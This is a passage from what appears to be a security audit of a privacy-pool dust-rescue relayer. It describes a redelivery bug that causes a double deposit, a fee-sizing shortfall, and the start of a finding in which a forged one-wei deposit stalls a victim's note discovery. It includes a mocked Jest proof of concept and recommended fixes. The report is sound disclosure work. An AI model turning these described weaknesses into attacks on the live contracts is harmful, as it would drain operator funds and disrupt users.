From the rewound state the sweep walks the job forward again. `SweepService.advance` dispatches purely on `job.state` and never reads `depositTxHash`, `receivingTxHash` or `sweptAmount`, the quantity of dust the detection step measured, to notice that the rescue is already done. `handleAwaitingDestination` re-runs `DetectionService.check`, which is keyed by transaction hash against the status API of LiFi, the bridge service the transfer crossed, rather than by balance, so a historical, settled transfer reports `DONE` again with the same `receiving.amount`, that record's report of what was delivered, and the job advances to `PROVING` with the same `sweptAmount` as before. `handleProving` re-proves unconditionally and overwrites `depositCalldata`, `depositTarget`, `depositMsgValue` and `approvalTx`. `handleSubmitting` then broadcasts a second deposit. The amount it carries has a floor and no ceiling in code: below `minWorthUsdMicros`, `2000000` micro-dollars, two dollars, on both chains in the shipped example configuration, the job is classified `BELOW_THRESHOLD` and never deposits, and above it `DetectionService.checkLeg` takes LiFi's `receiving.amount` as given and rejects only a zero.

The second deposit is not a replay the pool can recognise, and nothing on chain rejects it. `handleProving` does not re-send stored bytes: it calls `proveDustRescueDeposit` again, and that function draws fresh randomness on every invocation, a new ephemeral stealth keypair, a new `noteSecret`, a new `depositSecret` and a new random `hint`. The commitment is `H(precommitment, label)`, where `precommitment` is derived from `noteAddressHash = H(stealthAddress, noteSecret)` and `label` from `H(precommitment, depositSecret)`, so every one of those inputs differs when the job is re-proved, and the output commitment differs with it. `PoolVault.deposit`'s `require(!_commitmentExists(_commitment), PoolVault_CommitmentAlreadyUsed())` therefore cannot fire on this path. Determinism in `proveDustRescueDeposit` over the job's stored fields would give deposit #2 deposit #1's commitment and let that check reject it, and there is none. A deposit carries no nullifier to collide on, and there is no on-chain record keyed to the source transfer, so the pool sees two ordinary, well-formed deposits and accepts both.

The only compensating control is off-chain, and it exists for one asset class. `PoolSessionDeposit.buildApprovalTx` returns `null` for the native asset and otherwise approves exactly `value + fee`. `handleSubmitting` guards the approval with `if (job.approvalTx && !job.approvalTxHash)`, and `approvalTxHash` survives a state-only rewind, so the second run builds a fresh approval object, skips sending it, and meets the allowance that deposit #1 already consumed.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-service/src/pubsub/pubsub.controller.ts#L38-L49
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-service/src/jobs/firestore-job-store.service.ts#L24-L49
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-service/src/jobs/firestore-job-store.service.ts#L56-L65
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-service/src/jobs/job.types.ts#L14
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-service/src/sweep/sweep.service.ts#L36-L55
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-service/src/sweep/sweep.service.ts#L84-L137
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-service/src/detection/detection.service.ts#L41-L67
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-prover/src/proveDustRescueDeposit.ts#L92-L119
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-prover/src/proveDustRescueDeposit.ts#L138-L149
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/NoteComputationService.ts#L60-L95
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L110-L122
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionDeposit.ts#L452-L477
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-service/src/chain-write/chain-write.service.ts#L49-L77

#### Impact

On a native-asset job there is no allowance and nothing is bounded. `PoolVault.deposit` requires only `msg.value == _value`, so the signer wallet pays the rescued amount a second time out of its own balance and mints a second pool note to a fresh stealth address for the same recipient. That balance is the operator's shared rescue float: `ChainWriteService` signs every write, for every job and every destination chain, with the one configured signer key. The practical ceiling on a re-fire is therefore whatever that wallet holds, and the damage is transitive, because a drained float leaves every other pending job's `handleSubmitting` unfundable and each walks its `attempts` up to `sweepMaxAttempts` and terminates `FAILED`. `handleSubmitting` also overwrites `depositTxHash` with deposit #2's hash, so the job record no longer references the deposit that rescued the dust.

On an ERC-20 job the loss is usually a corrupted record rather than a payment. Deposit #2 meets a zero allowance and would revert in `safeTransferFrom`, but `ChainWriteService.send` calls viem's `sendTransaction` with no explicit `gas`, so estimation throws before anything is broadcast: no gas is spent, `recordFailure` consumes an attempt, and once `attempts` reaches `sweepMaxAttempts`, 5 in the shipped example configuration, a rescue that actually succeeded is written `FAILED` with a revert message as its `lastError`. That bound is incidental rather than designed, and it is not absolute: an allowance is a single (signer, entrypoint) pair rather than a per-job budget, so if a concurrent job for the same token has an approval outstanding, deposit #2 consumes that allowance and the other job's deposit is the one that fails, and any change that leaves an allowance standing when the sweep re-runs a completed job makes the re-fired deposit payable in full.

#### Proof of concept

`redelivery-rewind.spec.ts` drops into `packages/relayer/dust-rescue-service/src/pubsub/` and runs from `packages/relayer/dust-rescue-service` with `npx jest src/pubsub/redelivery-rewind.spec.ts`; its five tests pass at this commit. It delivers the same Pub/Sub message twice through the service's own `PubSubController` and then runs the service's own `SweepService` to completion, once for each delivery. It drops in beside `pubsub.controller.ts` in the dust-rescue service and runs under that package's jest test script. Five deliveries are covered: a duplicate arriving on a `CONFIRMED` job, on a `SUBMITTED` job, on a `SUBMITTING` job, on a `BELOW_THRESHOLD` job and on a `FAILED` job.

`PubSubController` and `SweepService` are the shipped classes, imported unmodified, so the rewind and the state walk that follows it are the product's own control flow. The job store is not the Firestore implementation: it is an in-memory stand-in reproducing the two semantics the defect turns on, `createPending` throwing `JobAlreadyExistsError` when the document already exists, and `update` being an unguarded field patch. `DetectionService`, `ChainWriteService` and the configuration service are mocks; `detection.check` is pinned to a fixed `READY` result with a constant `sweptAmount`, modelling a status lookup keyed by transaction hash against a transfer that has already settled. No chain and no pool contract are involved: `chainWrite.deposit` counts its calls and returns a synthetic hash.

`proveDustRescueDeposit` is mocked to a constant, so the spec does not exercise the commitment argument at all. That deposit #2 carries a different commitment, and therefore that `PoolVault_CommitmentAlreadyUsed` cannot reject it, is read from the prover's source, where every invocation draws a fresh ephemeral keypair, `noteSecret`, `depositSecret` and `hint`, and is not measured here. What the spec does measure is that the duplicate delivery moves a terminal `CONFIRMED` job back to `AWAITING_DESTINATION` and back into `listNonTerminal`, that `attempts` still reads 0 so nothing records the rewind, that the sweep then re-proves and calls `deposit` a second time while sending only one approval, and that `depositTxHash` is overwritten with the second hash. The third case also bounds the claim: a duplicate landing on a `SUBMITTING` job wastes a proof but produces only one deposit.

```ts
// Proof of concept. Not part of the repository's own test suite.
// Exercises the REAL PubSubController and REAL SweepService against a stateful
// in-memory job store that mirrors FirestoreDustRescueJobStore semantics
// (create() throws on existing doc; update() is an unguarded field patch).
import { mock } from "jest-mock-extended";
import { PubSubController } from "./pubsub.controller";
import { SweepService } from "../sweep/sweep.service";
import { JobAlreadyExistsError, type IDustRescueJobStore } from "../jobs/job-store.interface";
import { TERMINAL_STATES, type DustRescueJob, type NewDustRescueJob } from "../jobs/job.types";
import type { DetectionService } from "../detection/detection.service";
import type { ChainWriteService } from "../chain-write/chain-write.service";
import type { DustRescueConfigService } from "../config/dust-rescue-config.service";
import { proveDustRescueDeposit } from "@privacy-pools-v2/dust-rescue-prover";
import type { Hex } from "viem";

jest.mock("@privacy-pools-v2/dust-rescue-prover", () => ({ proveDustRescueDeposit: jest.fn() }));
jest.mock("../detection/detection.service", () => ({ DetectionService: jest.fn() }));
const mockProve = proveDustRescueDeposit as jest.Mock;

class InMemoryStore implements IDustRescueJobStore {
    docs = new Map<string, DustRescueJob>();
    async createPending(job: NewDustRescueJob): Promise<void> {
        if (this.docs.has(job.sourceTxHash)) throw new JobAlreadyExistsError(job.sourceTxHash);
        const now = Date.now();
        this.docs.set(job.sourceTxHash, { ...job, state: "PENDING", attempts: 0, createdAt: now, updatedAt: now });
    }
    async markAwaitingDestination(h: Hex): Promise<void> {
        await this.update(h, { state: "AWAITING_DESTINATION" });
    }
    async get(h: Hex): Promise<DustRescueJob | undefined> {
        return this.docs.get(h);
    }
    async listNonTerminal(): Promise<DustRescueJob[]> {
        return [...this.docs.values()].filter((j) => !TERMINAL_STATES.includes(j.state)).map((j) => ({ ...j }));
    }
    async update(h: Hex, patch: Partial<DustRescueJob>): Promise<void> {
        const cur = this.docs.get(h);
        if (!cur) throw new Error("NOT_FOUND");
        this.docs.set(h, { ...cur, ...patch, updatedAt: Date.now() });
    }
}

const JOB = {
    sourceTxHash: "0xaaa" as Hex,
    fromChainId: 1,
    destinationChainId: 8453,
    tokenId: "0x0000000000000000000000000000000000000aaa",
    recipientIdentifier: { kind: "raw" as const, spendingPubKey: "0xdead" as const },
    usdRate: { source: "Curve" as const, microUsdPerWholeTokenX1e18: `0x${(10n ** 18n).toString(16)}` as Hex, tokenDecimals: 0 },
};

function envelope(payload: unknown) {
    return {
        message: { data: Buffer.from(JSON.stringify(payload)).toString("base64"), messageId: "1", publishTime: "2026-08-17T00:00:00Z" },
        subscription: "projects/p/subscriptions/s",
    };
}

describe("Pub/Sub redelivery rewinds an advanced job and re-fires the deposit", () => {
    let store: InMemoryStore;
    let detection: ReturnType<typeof mock<DetectionService>>;
    let chainWrite: ReturnType<typeof mock<ChainWriteService>>;
    let config: ReturnType<typeof mock<DustRescueConfigService>>;
    let controller: PubSubController;
    let sweep: SweepService;
    let depositCount: number;

    beforeEach(() => {
        jest.clearAllMocks();
        store = new InMemoryStore();
        detection = mock<DetectionService>();
        chainWrite = mock<ChainWriteService>();
        config = mock<DustRescueConfigService>();
        config.sweepMaxAttempts.mockReturnValue(5);
        config.minWorthUsdMicros.mockReturnValue(1000n);
        config.chain.mockReturnValue({ rpcUrl: "http://x", aspUrl: "http://y", circuitArtifactsDir: "/z" } as never);

        // LiFi status is a historical fact: always DONE with the same amount for this hash.
        detection.check.mockResolvedValue({ outcome: "READY", sweptAmount: 10_000n, receivingTxHash: "0xrecv" });
        mockProve.mockResolvedValue({
            depositCallData: "0xcafe", depositTarget: "0x0000000000000000000000000000000000000e01",
            depositMsgValue: "0x0", approvalTx: { to: "0x0000000000000000000000000000000000000aaa", data: "0xa9", value: "0x0" },
        });
        chainWrite.approve.mockResolvedValue("0xapprove1");
        depositCount = 0;
        chainWrite.deposit.mockImplementation(async () => `0xdeposit${++depositCount}` as Hex);
        chainWrite.waitForReceipt.mockResolvedValue({ status: "success" } as never);
        controller = new PubSubController(store);
        sweep = new SweepService(store, detection, chainWrite, config);
    });

    it("CONFIRMED job: redelivery rewinds to AWAITING_DESTINATION; next sweeps submit a SECOND deposit, skip approval, overwrite depositTxHash", async () => {
        await controller.pending(envelope(JOB));
        expect((await store.get(JOB.sourceTxHash))!.state).toBe("AWAITING_DESTINATION");
        for (let i = 0; i < 4; i++) await sweep.run();
        const afterRound1 = (await store.get(JOB.sourceTxHash))!;
        expect(afterRound1.state).toBe("CONFIRMED");
        expect(chainWrite.deposit).toHaveBeenCalledTimes(1);
        expect(chainWrite.approve).toHaveBeenCalledTimes(1);
        expect(afterRound1.depositTxHash).toBe("0xdeposit1");
        expect(await store.listNonTerminal()).toHaveLength(0);

        // Pub/Sub at-least-once: the SAME message arrives again.
        await controller.pending(envelope(JOB));
        const rewound = (await store.get(JOB.sourceTxHash))!;
        expect(rewound.state).toBe("AWAITING_DESTINATION"); // rewound out of a terminal state
        expect(rewound.depositTxHash).toBe("0xdeposit1"); // artefacts survive the state-only patch
        expect(rewound.approvalTxHash).toBe("0xapprove1");
        expect(rewound.attempts).toBe(0); // nothing records that a rewind happened
        expect(await store.listNonTerminal()).toHaveLength(1); // back in the sweep working set

        for (let i = 0; i < 4; i++) await sweep.run();
        const afterRound2 = (await store.get(JOB.sourceTxHash))!;
        expect(afterRound2.state).toBe("CONFIRMED");
        expect(chainWrite.deposit).toHaveBeenCalledTimes(2); // <-- second deposit for one rescue
        expect(chainWrite.approve).toHaveBeenCalledTimes(1); // round-2 approval skipped (approvalTxHash survived)
        expect(afterRound2.depositTxHash).toBe("0xdeposit2"); // round-1 hash lost from the record
        expect(mockProve).toHaveBeenCalledTimes(2);
        expect(detection.check).toHaveBeenCalledTimes(2);
    });

    it("SUBMITTED (not yet confirmed) job: redelivery also yields a second deposit", async () => {
        await controller.pending(envelope(JOB));
        for (let i = 0; i < 3; i++) await sweep.run();
        expect((await store.get(JOB.sourceTxHash))!.state).toBe("SUBMITTED");
        expect(chainWrite.deposit).toHaveBeenCalledTimes(1);
        await controller.pending(envelope(JOB));
        expect((await store.get(JOB.sourceTxHash))!.state).toBe("AWAITING_DESTINATION");
        for (let i = 0; i < 4; i++) await sweep.run();
        expect(chainWrite.deposit).toHaveBeenCalledTimes(2);
        expect((await store.get(JOB.sourceTxHash))!.state).toBe("CONFIRMED");
    });

    it("SUBMITTING (calldata built, nothing broadcast) job: redelivery causes re-work but only ONE deposit", async () => {
        await controller.pending(envelope(JOB));
        for (let i = 0; i < 2; i++) await sweep.run();
        expect((await store.get(JOB.sourceTxHash))!.state).toBe("SUBMITTING");
        expect(chainWrite.deposit).toHaveBeenCalledTimes(0);
        await controller.pending(envelope(JOB));
        expect((await store.get(JOB.sourceTxHash))!.state).toBe("AWAITING_DESTINATION");
        for (let i = 0; i < 4; i++) await sweep.run();
        expect(chainWrite.deposit).toHaveBeenCalledTimes(1);
        expect(mockProve).toHaveBeenCalledTimes(2); // wasted second proof
    });

    it("BELOW_THRESHOLD job: redelivery resurrects it, re-detection re-classifies it, no deposit", async () => {
        config.minWorthUsdMicros.mockReturnValue(1_000_000n); // sweptAmount 10_000 < threshold
        await controller.pending(envelope(JOB));
        await sweep.run();
        expect((await store.get(JOB.sourceTxHash))!.state).toBe("BELOW_THRESHOLD");
        await controller.pending(envelope(JOB));
        expect((await store.get(JOB.sourceTxHash))!.state).toBe("AWAITING_DESTINATION");
        await sweep.run();
        expect((await store.get(JOB.sourceTxHash))!.state).toBe("BELOW_THRESHOLD");
        expect(chainWrite.deposit).toHaveBeenCalledTimes(0);
        expect(detection.check).toHaveBeenCalledTimes(2);
    });

    it("FAILED job (attempts exhausted): redelivery resurrects it with attempts intact; one more error re-terminates it", async () => {
        await controller.pending(envelope(JOB));
        await store.update(JOB.sourceTxHash, { state: "FAILED", attempts: 5, lastError: "x" });
        await controller.pending(envelope(JOB));
        const j = (await store.get(JOB.sourceTxHash))!;
        expect(j.state).toBe("AWAITING_DESTINATION");
        expect(j.attempts).toBe(5);
        detection.check.mockRejectedValueOnce(new Error("LiFi 429"));
        await sweep.run();
        expect((await store.get(JOB.sourceTxHash))!.state).toBe("FAILED");
    });
});
```

Recorded result of running the spec under Jest:

```text
Tests:  5 passed, 5 total
```

#### Recommendation

We recommend making the handler idempotent in the shape the queue actually requires. Move `markAwaitingDestination` inside the creation branch, so a duplicate delivery does nothing, and guard the transition itself rather than the call site: advance a job to `AWAITING_DESTINATION` only from the states that legitimately precede it, and reject any write that would move a job backwards. That needs a compare-and-set primitive on `IDustRescueJobStore`, a Firestore transaction or an update with a state precondition, because the interface currently offers only an unconditional `update`, so no implementation can enforce the rule today. We also recommend a second, independent stop before value leaves the wallet: have `handleSubmitting` refuse to broadcast when `depositTxHash` is already set. Either that refusal or the transition guard alone turns the worst outcome into a logged anomaly. Alongside the refusal, clear `approvalTxHash` whenever `approvalTx` is rebuilt, so the two can never disagree about whether an approval is outstanding. Recording the delivery identifier on the job and ignoring a message the job has already processed would absorb replays at the entry point rather than at each transition, covering operator replay as well as platform redelivery, and configuring a dead-letter topic and a maximum delivery attempt count on the subscription bounds how long a redelivery can keep arriving.

We also recommend reconciling the log line and the class comment with the behaviour. `PubSubController.pending` logs `treating as no-op` for a delivery that is not a no-op, and `FirestoreDustRescueJobStore`'s class comment claims the document-ID-as-`sourceTxHash` scheme gives "idempotent upsert ... for free", which is true of the document and false of the state field. A regression test that delivers the same message twice with the job in `CONFIRMED` and asserts a single `deposit` call would pin the fix.

#### Verification

**Verdict: CONFIRMED** by an executed proof of concept. The drop path, the run command and the expected output are given in the proof-of-concept section above.

### #008 — The rescue note is sized at the swept amount while `Entrypoint.deposit` pulls that amount plus the vetting fee

**Severity:** Medium · **Location:** `packages/relayer/dust-rescue-service/src/detection/detection.service.ts` · **Bug:** High · **Payout:** Medium · **Novelty:** NEW · **Reach:** PERM · **Status:** Open

#### Description

A cross-chain reshield never lands exactly on its target, so a small residue is left stranded at the destination. The dust-rescue service turns that residue into a note for the user it belongs to: it measures how much actually landed at the shared rescue wallet, builds a deposit whose note value equals that measurement, and sends that deposit from the same wallet, because the pool's `Entrypoint` pulls the funds from whoever sends the transaction. The `Entrypoint` also charges a vetting fee on every deposit, a percentage of the note's value taken for screening it, and pulls the value and the fee together from the sender.

That wallet was sent the dust and nothing else, so it holds the value and not the fee, and the deposit reverts. The sweep's own retry is the remedy the service has for a rescue that does not land, and it cannot help here, because the arithmetic is identical on every attempt: each attempt pays for an approval transaction that is mined, the deposit then fails in gas estimation before it is broadcast, and after the configured five attempts the job is written off as failed. The residue stays in the operator's wallet and the note the rescue exists to create is never minted.

**Where it breaks.** Both halves size the same deposit, from different formulas:

- the note is sized at the amount measured as delivered, `S`;
- the `Entrypoint` pulls `S` plus the vetting fee on `S` from the sender.

So the wallet is short by exactly the fee on every job, deterministically. This is not a corner of the configuration: on the two chains the shipped configuration names, Arbitrum One and Base, the live Entrypoints charge 1 % on every ERC-20 they enable, so it is every stablecoin rescue on both.

Where that wallet is holding several users' dust at once the shortfall is quieter and worse, because a deposit that does go through takes the difference out of the pooled balance, so an early job completes on a later job's money and the user who bears the loss is not the user who caused it.

The funding side is `DetectionService.check`, which sums the delivered amount reported for each bridge leg into `sweptAmount`. `checkLeg` takes that quantity from the bridge status record's `receiving.amount`, the token quantity that arrived in the wallet and no more. `SweepService.handleProving` passes `sweptAmount` through unchanged to `proveDustRescueDeposit`, which uses it as the note `value` in `prepareDepositFor`, and also as the input to `computePrecommitment` and to the encrypted note payload, so the figure is committed into the proof.

The spending side then adds the fee back. `PoolSessionDeposit.prepareDepositInternal` sizes the outgoing transfer through `computeMsgValue` for native assets and `buildApprovalTx` for ERC-20s, both of which compute `value + value × vettingFeeBPS / 10_000`. The basis-point figure they use is not a constant: `validateAssetConfig` reads it live from the destination `Entrypoint` through `EntrypointInteractor.getAssetConfig`, so the SDK sizes the spend against the real deployed fee. `Entrypoint.deposit` charges the same way: it derives the fee with `FeeCalculator.calcFee`, `(_amount * _bps) / MAX_FEE_BPS` with `MAX_FEE_BPS = 10_000`, forms `_amountPlusFees`, and pulls that sum from the caller with `safeTransferFrom` for an ERC-20 or requires it as `msg.value` for native ETH. Only `_value` is forwarded to the `PoolVault`; the fee stays in the `Entrypoint`.

Delivered is `S`. Required is `S + S × bps / 10_000`. The deficit is the fee, on every job, deterministically. A netting step, a balance pre-check or an operator top-up anywhere between `DetectionService.check` and `ChainWriteService.deposit` would close the gap, and the path contains none: `handleProving` forwards the measured amount untouched, and `handleSubmitting` reads only the calldata and approval the proving step recorded.

Every live `Entrypoint` charges 100 bps on both stablecoins, so no ERC-20 rescue is dormant anywhere. Reading `assets(address)`, which returns `(bool enabled, uint256 minAmount, uint256 vettingFeeBPS, uint256 maxRelayFee)`, on every `Entrypoint` instance the repository's deployment manifests name, and decoding against the full struct signature:

| stack | `Entrypoint` | native ETH | USDC | USDT |
| --- | --- | --- | --- | --- |
| mainnet (recorded as pre-existing production infrastructure) | `0x02a1E00294291d0E938eC92A8c2883044524ec4B` | 100 | 100 | 100 |
| Optimism (same production pair) | `0x4A20b3ae656339b9707C61992dCdA642366D3004` | 100 | 100 | 100 |
| Optimism (coordinated stack) | `0xe7fd6c857639E3a7cCf3Cd765B5816Cfc95C0890` | 0 | 100 | 100 |
| Arbitrum | `0xad0b4d5212C126B334Af11Bf4547eF4C91Bfcf44` | 0 | 100 | 100 |
| Base | `0xe7fd6c857639e3a7ccf3cd765b5816cfc95c0890` | 0 | 100 | 100 |
| BSC | `0xCaf817D6D3A7cF78fe8d3a337bB42F934E6E846b` | 0 | 100 | 100 |

Every row returns `enabled = true`, `minAmount = 1` base unit and `maxRelayFee = type(uint256).max`. `ChainAssetRegistry` reproduces the same pattern in the tree: mainnet is 100 bps on all three assets, Arbitrum and Base are 0 on native ETH and 100 on both ERC-20s.

The shipped dust-rescue configuration names chains 42161 and 8453, Arbitrum One and Base. On both, every ERC-20 rescue is short by 1 %; only the native-ETH path on those two chains carries a zero fee and therefore a zero deficit. The two instances recorded as production infrastructure charge the fee on native ETH as well, so a rescue pointed at either of those chains is short on every asset they enable.

Where the wallet holds only this job's dust, `SweepService.handleSubmitting` first broadcasts the approval. That transaction is sized correctly, since `buildApprovalTx` approves exactly `value + fee`, and it succeeds because ERC-20 `approve` does not check the balance; it is mined and it costs gas. The deposit that follows fails before it is broadcast: `ChainWriteService.send` calls `walletClient.sendTransaction` with no explicit `gas` on a local account created by `privateKeyToAccount`, and the pinned viem, 2.22.14 in the workspace catalog, routes a local-account send through its transaction-preparation step, whose default parameter set includes `gas`, so it issues `eth_estimateGas` before signing. The underfunded deposit reverts in estimation, `send` rethrows, and `SweepService.run`'s per-job catch routes to `recordFailure`. Nothing is broadcast for the deposit, no gas is burned on the reverting call, and no nullifier or note is created. After `sweepMaxAttempts`, 5 in the shipped configuration, `recordFailure` writes the job terminal `FAILED`; the revert branch in `handleSubmitted` is not the one that fires, and the recurring cost is one mined approval per attempt, a few cents. The revert cause is the balance rather than the allowance: the approval covers `value + fee` exactly, so the only check that can fail is the Entrypoint's `safeTransferFrom` pulling `_amountPlusFees` from a wallet that holds only `_value`.

The repository's own tests confirm the shortfall and then hide it. Both Base dust-rescue integration tests read the live `vettingFeeBPS` with the full struct signature and compute `dustRescueNoteValue = (combinedSweptAmount * 10000n) / (10000n + vettingFeeBPS)`, then pass that to `proveDustRescueDeposit` instead of the combined swept amount. The comment above it states the defect and records an executed confirmation: passing the swept amount as-is "means the wallet must hold that fee on TOP of the dust it just received, which it often doesn't (confirmed twice: TransferFromFailed reverts with allowance/proof both valid, just short of the gross amount by exactly the fee)". The suite is green because the harness patches the production arithmetic, so a regression here has no covering test.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-service/src/detection/detection.service.ts#L41-L66
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-service/src/sweep/sweep.service.ts#L84-L100
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-prover/src/proveDustRescueDeposit.ts#L182-L188
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionDeposit.ts#L433-L442
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionDeposit.ts#L452-L477
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Entrypoint.sol#L72-L84
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/abstracts/FeeCalculator.sol#L23-L25
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/script/registries/ChainAssetRegistry.sol#L60-L127
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-service/src/chain-write/chain-write.service.ts#L49-L77
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionReshieldCrosschain.ts#L248-L256
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionReshieldCrosschain.ts#L540-L548
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/test/mainnet-crosschain-relay-swaps-reshield-to-base-dust-rescue.integration.test.ts#L902-L930
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/test/mainnet-crosschain-relay-swaps-reshield-to-base-usdt-dust-rescue.integration.test.ts#L902-L930

#### Impact

On a fee-bearing asset the rescue cannot complete from its own funds, and on the live instances every ERC-20 is fee-bearing. The deficit is present on the first job, on a clean sweep, and the retry never succeeds because the arithmetic is identical on every attempt. Against the live fee table above, that is every USDC and USDT rescue on every chain the service is configured for. The dust remains in the wallet, recoverable because the signer key is the service's own, but the user's note never comes into existence.

Where the wallet holds several users' dust, the outcome is worse and quieter. The rescue wallet is one address shared across every destination chain and every user, and `SweepService` processes jobs sequentially precisely because that key is global. Each successful deposit removes more from the shared balance than the job that funded it delivered, so an early job completes by consuming a later job's funds and the deficit accumulates until the tail jobs cannot pay. The user who bears the failure is not the user who caused it, and nothing in the job accounting attributes the loss. No multi-job sequence was executed: this leg is a deduction from the shared-wallet and sequential-processing design and from the per-job arithmetic, not a measurement.

No third party takes anything: the fee reaches the `Entrypoint`, which legitimately earned a vetting fee on the deposit it processed, and the stranded dust never leaves an address whose key the operator holds. What is defective is which job's money paid it, and that a named product path does not work at all.

#### Recommendation

We recommend sizing the note from the budget rather than sizing the budget from the note. Before proving, read the destination `vettingFeeBPS` and derive the note value as `sweptAmount × 10_000 / (10_000 + vettingFeeBPS)`, then re-check the result against the destination `minAmount` so an inverted value does not fall below the floor. The natural place is `SweepService.handleProving`, which already holds the destination chain configuration, or `proveDustRescueDeposit` itself, which already opens a client against the destination `Entrypoint`. This inversion is not new work: `PoolSessionReshieldCrosschain.estimateReshieldCrosschainAmount` computes exactly this note value, derives the fee from it and re-checks `minAmount`; `prepareReshieldCrosschainQuote` computes the same inversion again to report an affordable note value when the destination budget is too small, and re-derives `noteValue + fee` as a staleness assertion; and both Base dust-rescue integration tests compute it a third time, in the harness, for this exact flow. The formula exists in the codebase and is simply not applied on the rescue path, so the defect is an inconsistent application of a control the project already has, not a missing one. Funding the shared rescue wallet with a working float would make the jobs complete, but it is a mitigation and not a fix, because the shortfall would still be taken from the float on every job, silently and without attribution, instead of surfacing as a failure. Because `ChainWriteService.safeErrorMessage` deliberately strips call arguments before logging, what reaches the operator today is a short revert message with no indication that the wallet was short by exactly the vetting fee, so we also recommend a balance check against `_amountPlusFees` before submitting, with the shortfall in the error text.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #009 — A forged note payload in a one-wei deposit pins a victim's note-discovery sync cursor at the attacker's block

**Severity:** Medium · **Location:** `packages/sdk/src/services/poolSessions/PoolSessionNoteDiscovery.ts` · **Bug:** High · **Payout:** High · **Novelty:** DIFF · **Reach:** PERM · **Root cause:** RC-06 (2 findings) · **Kill chain:** KC-04 · **Status:** Open

#### Description

A note is delivered to its owner by publishing an encrypted payload on chain, beside the deposit or spend that created it. Nothing on chain says whose payload is whose, so a wallet finds its own notes by reading every note event and trying to decrypt each payload with its viewing key, a key pair held for exactly that purpose; whatever decrypts is taken to be the wallet's. Re-reading the whole chain on every pass is not viable, so the wallet keeps a sync cursor, the block its next scan starts from, and moves it up to the head at the end of each pass.

Before it stores a decrypted note, the wallet looks up the note's commitment, its public identifier on chain, and it will not store a note whose commitment is not there. A missing commitment usually means an RPC node a block or two behind the event, so rather than skip the note the wallet holds the cursor back at the earliest discovery it could not resolve, and retries from there next pass. That hold is the remedy for a lagging node, and it has no time limit and no recency test. A payload whose commitment will never exist therefore holds the cursor for good: the discovery is never stored as a note, so nothing deduplicates it and the phantom-note purge cannot see it, and every later pass repeats the same failed lookup from the same block over a window that grows with the chain.

**Where it breaks.** Decryption is treated as proof that a payload was meant for this wallet, and it is not:

- the authentication tag proves that whoever wrote the payload knew the recipient's viewing key;
- the half of the viewing key needed to write one is the public half, which the `Keystore` contract hands to anyone who asks for an address.

So anyone can compose a payload a chosen victim's wallet will decrypt and accept as its own, commit to nothing on chain, and publish it inside a deposit of one wei, which the `Entrypoint` accepts because the deploy-time asset registry sets the minimum at one base unit on every asset.

For that one wei, every discovery pass the victim runs from then on re-reads a window that grows with the chain, until one of those reads is rate-limited and throws the pass before the step that makes a newly deposited note spendable, after which the ordinary spend path refuses every note the victim receives, while the unconditional exit stays open and no funds are lost.

In the `PoolSessionNoteDiscovery` service, `discoverNotes` picks the next sync cursor from the results of the pass it just ran, and one input to that choice is fully attacker-controlled. Three separately reasonable behaviours compose into the defect.

